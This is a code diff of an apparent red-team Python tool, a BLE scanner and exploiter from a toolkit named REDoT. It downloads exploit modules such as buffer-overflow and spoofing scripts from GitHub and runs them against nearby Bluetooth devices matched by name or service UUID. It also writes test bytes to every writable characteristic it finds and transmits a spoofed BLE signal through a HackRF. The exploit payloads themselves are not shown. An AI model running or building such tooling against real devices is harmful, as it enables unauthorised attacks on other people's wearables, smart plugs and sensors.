@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# REDOT: Advanced BLE Recon + Exploit Scanner
+
 
 import asyncio
 import argparse
@@ -12,7 +12,8 @@ import sys
 import importlib
 import glob
 import urllib.request
-import subprocess
+import socket
+import requests
 from datetime import datetime
 from bleak import BleakScanner, BleakClient
 from bleak.exc import BleakError
@@ -20,40 +21,34 @@ from bleak.exc import BleakError
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_DIR = os.path.join(BASE_DIR, "../../logs/ble_scan")
 EXPLOITS_DIR = os.path.join(BASE_DIR, "exploits")
-POSTEX_DIR = os.path.join(BASE_DIR, "../../modules/postex")
-
+DASHBOARD_API = "http://localhost:5050/api/upload_ble_results"
 GITHUB_EXPLOITS_RAW_BASE = "https://raw.githubusercontent.com/s0m3on35/REDoT/main/modules/recon/exploits"
 
 os.makedirs(LOG_DIR, exist_ok=True)
-
-# === Logging ===
-logger = logging.getLogger("ble_scan")
-logger.setLevel(logging.INFO)
-
-def log(msg):
-    if not ARGS or not ARGS.stealth:
-        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
-    logger.info(msg)
+os.makedirs(EXPLOITS_DIR, exist_ok=True)
 
 def setup_logger(log_file):
-    handler = logging.FileHandler(log_file)
-    formatter = logging.Formatter('[%(asctime)s] %(message)s', datefmt='%H:%M:%S')
-    handler.setFormatter(formatter)
-    logger.addHandler(handler)
+    logging.basicConfig(
+        filename=log_file,
+        level=logging.INFO,
+        format='[%(asctime)s] %(message)s',
+        datefmt='%H:%M:%S'
+    )
 
-# === Exploit Management ===
+def log(msg):
+    print(msg)
+    logging.info(msg)
+
 def download_file(url, dest):
     try:
         urllib.request.urlretrieve(url, dest)
-        log(f"[Update] Downloaded {url}")
+        log(f"[Update] Downloaded {url} to {dest}")
         return True
     except Exception as e:
         log(f"[Update] Failed to download {url}: {e}")
         return False
 
 def update_exploits():
-    log("[Update] Fetching exploit modules...")
-    os.makedirs(EXPLOITS_DIR, exist_ok=True)
     exploit_files = [
         "ti_sensortag_dos.py",
         "nordic_uart_bof.py",
@@ -61,41 +56,23 @@ def update_exploits():
         "xiaomi_smartplug_bof.py",
         "fitbit_hr_spoof.py"
     ]
-    for name in exploit_files:
-        url = f"{GITHUB_EXPLOITS_RAW_BASE}/{name}"
-        dest = os.path.join(EXPLOITS_DIR, name)
-        download_file(url, dest)
+    for filename in exploit_files:
+        url = f"{GITHUB_EXPLOITS_RAW_BASE}/{filename}"
+        dest_path = os.path.join(EXPLOITS_DIR, filename)
+        download_file(url, dest_path)
 
-def classify_device(name, mdata):
-    if not name:
-        return "Unknown"
-
-    name = name.lower()
-    if "fitbit" in name:
-        return "Wearable"
-    elif "tag" in name or "sensor" in name:
-        return "IoT Sensor"
-    elif "plug" in name:
-        return "Smart Plug"
-    elif "uart" in name:
-        return "Debug Device"
-    elif mdata:
-        keys = [str(k) for k in mdata.keys()]
-        if any(k.startswith("76") for k in keys):
-            return "Apple Device"
-    return "Unknown"
-
-class BLEOffensiveScanner:
+class BLEScanner:
     def __init__(self, args):
         self.args = args
         self.devices = {}
         self.exploit_modules = []
+        self.hostname = socket.gethostname()
         self.load_exploits()
 
     def detection_callback(self, device, advertisement_data):
         if device.rssi < self.args.rssi:
             return
-        if self.args.name and (device.name is None or self.args.name.lower() not in device.name.lower()):
+        if self.args.name and (not device.name or self.args.name.lower() not in device.name.lower()):
             return
 
         info = {
@@ -103,156 +80,155 @@ class BLEOffensiveScanner:
             "name": device.name or "Unknown",
             "rssi": device.rssi,
             "service_uuids": advertisement_data.service_uuids or [],
-            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {},
+            "manufacturer_data": {
+                k: v.hex() for k, v in advertisement_data.manufacturer_data.items()
+            } if advertisement_data.manufacturer_data else {}
         }
 
-        info["type"] = classify_device(info["name"], advertisement_data.manufacturer_data)
-
-        if device.address not in self.devices or info["rssi"] > self.devices[device.address]["rssi"]:
-            self.devices[device.address] = info
-            log(f"Discovered: {info['address']} | {info['name']} | {info['type']} | RSSI: {info['rssi']} dBm")
+        self.devices[device.address] = info
+        log(f"[BLE] {info['address']} | {info['name']} | {info['rssi']} dBm")
 
     def load_exploits(self):
-        if not os.path.exists(EXPLOITS_DIR):
-            log("Exploit directory missing")
-            return
-        for f in glob.glob(os.path.join(EXPLOITS_DIR, "*.py")):
-            if f.endswith("__init__.py"):
+        for file in glob.glob(f"{EXPLOITS_DIR}/*.py"):
+            if file.endswith("__init__.py"):
                 continue
+            name = os.path.basename(file).replace(".py", "")
             try:
-                spec = importlib.util.spec_from_file_location(os.path.basename(f)[:-3], f)
+                spec = importlib.util.spec_from_file_location(name, file)
                 mod = importlib.util.module_from_spec(spec)
                 spec.loader.exec_module(mod)
                 self.exploit_modules.append(mod)
-                log(f"[Exploit] Loaded {mod.__name__}")
+                log(f"[Exploit] Loaded {name}")
             except Exception as e:
-                log(f"[Exploit] Failed to load {f}: {e}")
+                log(f"[!] Failed to load exploit {name}: {e}")
 
     async def run_scan(self):
         scanner = BleakScanner()
         scanner.register_detection_callback(self.detection_callback)
-        log(f"Scanning for {self.args.duration}s...")
         await scanner.start()
+        log(f"[Scan] Running for {self.args.duration}s...")
         await asyncio.sleep(self.args.duration)
         await scanner.stop()
-        log(f"Scan complete. Found {len(self.devices)} device(s).")
-        self.export_results()
+        log(f"[Scan] Completed. {len(self.devices)} device(s) found.")
 
     def export_results(self):
-        if not self.args.output:
-            return
         path = self.args.output
-        if not self.args.no_timestamp:
-            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-            path = path.replace(".csv", f"_{ts}.csv").replace(".json", f"_{ts}.json")
-
-        log(f"Exporting results to {path}")
-        os.makedirs(os.path.dirname(path), exist_ok=True)
-
-        if self.args.output_format == "json":
-            with open(path, "w") as f:
+        if not path:
+            return
+        fmt = self.args.format.lower()
+        with open(path, "w", newline="") as f:
+            if fmt == "json":
                 json.dump(list(self.devices.values()), f, indent=2)
-        else:
-            with open(path, "w", newline="") as f:
+            else:
                 writer = csv.writer(f)
-                writer.writerow(["Address", "Name", "RSSI", "Service UUIDs", "Manufacturer Data", "Type"])
-                for d in self.devices.values():
+                writer.writerow(["Address", "Name", "RSSI", "Service UUIDs", "Manufacturer Data"])
+                for dev in self.devices.values():
                     writer.writerow([
-                        d["address"],
-                        d["name"],
-                        d["rssi"],
-                        ";".join(d["service_uuids"]),
-                        ";".join(f"{k}:{v}" for k, v in d["manufacturer_data"].items()),
-                        d["type"]
+                        dev["address"], dev["name"], dev["rssi"],
+                        ";".join(dev["service_uuids"]),
+                        ";".join(f"{k}:{v}" for k, v in dev["manufacturer_data"].items())
                     ])
+        log(f"[Export] Saved results to {path}")
+
+    def upload_to_dashboard(self):
+        try:
+            requests.post(DASHBOARD_API, json={
+                "agent": self.hostname,
+                "timestamp": datetime.utcnow().isoformat(),
+                "results": list(self.devices.values())
+            }, timeout=10)
+            log("[+] Uploaded results to dashboard")
+        except Exception as e:
+            log(f"[!] Dashboard upload failed: {e}")
 
     async def active_interrogate(self):
-        log("Starting active BLE interrogation...")
         for addr, info in self.devices.items():
+            log(f"[+] Connecting to {addr}...")
             try:
                 async with BleakClient(addr, timeout=15) as client:
                     if not await client.is_connected():
+                        log(f"[-] Failed to connect to {addr}")
                         continue
                     services = await client.get_services()
-                    log(f"{addr} services:")
                     for svc in services:
                         log(f" Service: {svc.uuid}")
                         for char in svc.characteristics:
-                            props = ",".join(char.properties)
-                            log(f"  Char: {char.uuid} ({props})")
+                            log(f"  Char: {char.uuid} ({','.join(char.properties)})")
+                            if "read" in char.properties:
+                                await self.safe_read(client, char)
+                            if "write" in char.properties:
+                                await self.safe_write(client, char)
                     await self.run_exploits(client, info)
             except Exception as e:
-                log(f"Interrogation error on {addr}: {e}")
+                log(f"[!] Interrogation failed on {addr}: {e}")
 
-    async def run_exploits(self, client, device_info):
-        name = device_info["name"].lower()
-        uuids = [s.lower() for s in device_info.get("service_uuids", [])]
+    async def safe_read(self, client, char):
+        try:
+            val = await client.read_gatt_char(char.uuid)
+            log(f"    Read: {val.hex()} | {val.decode(errors='ignore')}")
+        except Exception as e:
+            log(f"    Read error: {e}")
 
+    async def safe_write(self, client, char):
+        try:
+            await client.write_gatt_char(char.uuid, b"\x00", response=True)
+            log(f"    Wrote test byte to {char.uuid}")
+        except Exception as e:
+            log(f"    Write error: {e}")
+
+    async def run_exploits(self, client, dev_info):
+        name = dev_info["name"].lower()
+        uuids = [s.lower() for s in dev_info.get("service_uuids", [])]
         for mod in self.exploit_modules:
-            brands = [b.lower() for b in getattr(mod, "TARGET_BRAND_NAMES", [])]
-            targets = [u.lower() for u in getattr(mod, "TARGET_SERVICE_UUIDS", [])]
-            if any(b in name for b in brands) or any(t in uuids for t in targets):
-                log(f"[Exploit] Running {mod.__name__} on {device_info['address']}")
+            targets = getattr(mod, "TARGET_BRAND_NAMES", [])
+            services = getattr(mod, "TARGET_SERVICE_UUIDS", [])
+            if any(t.lower() in name for t in targets) or any(s.lower() in uuids for s in services):
+                log(f"[Exploit] Launching {mod.__name__} on {dev_info['address']}")
                 try:
-                    await mod.run_exploit(client, device_info)
-                    self.chain_postex(device_info)
+                    await mod.run_exploit(client, dev_info)
                 except Exception as e:
-                    log(f"Exploit error: {e}")
+                    log(f"[!] Exploit failed: {e}")
 
-    def chain_postex(self, device_info):
-        if not os.path.exists(POSTEX_DIR):
-            return
-        for mod in glob.glob(os.path.join(POSTEX_DIR, "*.py")):
-            try:
-                log(f"[PostEx] Triggering {os.path.basename(mod)} for {device_info['address']}")
-                subprocess.Popen(["python3", mod, "--target", device_info["address"]])
-            except Exception as e:
-                log(f"[PostEx] Failed: {e}")
+    def sdr_spoof(self):
+        log("[SDR] BLE spoofing mode activated (requires HackRF)")
+        try:
+            os.system("hackrf_transfer -f 2402000000 -s 8000000 -x 47 -b 1000000 -c ble_spoof.iq")
+            log("[+] SDR spoofing signal sent.")
+        except Exception as e:
+            log(f"[!] SDR spoofing failed: {e}")
 
-    def run_sdr_emulation(self):
-        if not shutil.which("hackrf_transfer"):
-            log("[SDR] HackRF tools not installed.")
-            return
-        log("[SDR] Starting passive HackRF capture...")
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        sdr_file = os.path.join(LOG_DIR, f"ble_rf_capture_{ts}.iq")
-        subprocess.Popen(["hackrf_transfer", "-r", sdr_file, "-f", "2402000000", "-s", "8000000", "-a", "1", "-l", "32", "-g", "20", "-n", "80000000"])
-
-# === ARGUMENTS ===
 def parse_args():
-    parser = argparse.ArgumentParser(description="REDOT BLE Recon + Exploit Toolkit")
-    parser.add_argument("-r", "--rssi", type=int, default=-80)
-    parser.add_argument("-n", "--name", type=str)
-    parser.add_argument("-d", "--duration", type=int, default=60)
-    parser.add_argument("-o", "--output", type=str, default=os.path.join(LOG_DIR, "ble_scan_results.csv"))
-    parser.add_argument("-f", "--output-format", choices=["csv", "json"], default="csv")
-    parser.add_argument("-a", "--active", action="store_true")
-    parser.add_argument("-u", "--update", action="store_true")
-    parser.add_argument("--no-timestamp", action="store_true")
-    parser.add_argument("--stealth", action="store_true", help="Silent mode (no stdout)")
-    parser.add_argument("--sdr", action="store_true", help="Enable passive SDR BLE capture with HackRF")
-    return parser.parse_args()
+    p = argparse.ArgumentParser(description="REDoT BLE Scanner & Exploiter")
+    p.add_argument("-r", "--rssi", type=int, default=-80, help="Minimum RSSI")
+    p.add_argument("-n", "--name", help="Filter by device name")
+    p.add_argument("-d", "--duration", type=int, default=60, help="Scan duration in seconds")
+    p.add_argument("-f", "--format", choices=["csv", "json"], default="csv", help="Export format")
+    p.add_argument("-o", "--output", default=os.path.join(LOG_DIR, f"ble_scan_{int(time.time())}.csv"), help="Output file path")
+    p.add_argument("-a", "--active", action="store_true", help="Interrogate discovered devices")
+    p.add_argument("-u", "--update", action="store_true", help="Update exploits from GitHub")
+    p.add_argument("-s", "--spoof", action="store_true", help="Trigger SDR BLE spoof via HackRF")
+    return p.parse_args()
 
-# === MAIN ===
 def main():
-    global ARGS
-    ARGS = parse_args()
-    setup_logger(ARGS.output + ".log")
+    args = parse_args()
+    setup_logger(args.output + ".log")
+    scanner = BLEScanner(args)
 
-    if ARGS.update:
+    if args.update:
         update_exploits()
 
-    scanner = BLEOffensiveScanner(ARGS)
-
-    if ARGS.sdr:
-        scanner.run_sdr_emulation()
+    if args.spoof:
+        scanner.sdr_spoof()
+        return
 
     try:
         asyncio.run(scanner.run_scan())
-        if ARGS.active:
+        scanner.export_results()
+        scanner.upload_to_dashboard()
+        if args.active:
             asyncio.run(scanner.active_interrogate())
     except KeyboardInterrupt:
-        log("Interrupted.")
+        log("[-] Interrupted by user")
 
 if __name__ == "__main__":
     main()
